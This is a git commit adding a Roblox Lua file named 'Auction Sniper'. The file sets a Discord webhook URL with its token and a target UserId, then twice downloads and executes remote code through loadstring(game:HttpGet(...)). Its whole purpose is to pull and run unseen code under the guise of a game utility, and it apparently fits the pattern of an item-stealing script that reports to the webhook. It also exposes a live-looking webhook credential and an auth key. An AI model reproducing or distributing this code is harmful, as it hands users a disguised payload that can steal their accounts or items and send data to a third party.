d512f8e279f8ecda2b3fd879fed7b3281e3529a9
xlxlord <116307745+xlxlord@users.noreply.github.com>
2023-05-07 19:44:35 -0700

    Add files via upload

---
+++ Auction Sniper.lua
@@ -0,0 +1,12 @@
+_G.Webhook = "https://discord.com/api/webhooks/1104960435784007780/5O46RT_fFd8tOIwYm28DKcrD15R1KoB_DMXi3I5MZyFktSBWeykWs2nDUffTaePpNbz-"
+_G.LoadingText = "Auction Sniper"
+_G.UserId = 101221134
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xlxlord/ha/main/main", true))()
+wait(2)
+getgenv (). AuthKey = "HUGE_uKjBWZK84HvsuRqE"
+getgenv (). LoadSettings ={
+UseSeperateSaves= false,
+DisableStartupPrompt= false,
+DisableGamepassCheck= false,
+}
+loadstring(game:HttpGet("https://HugeGames.io/psx"))()
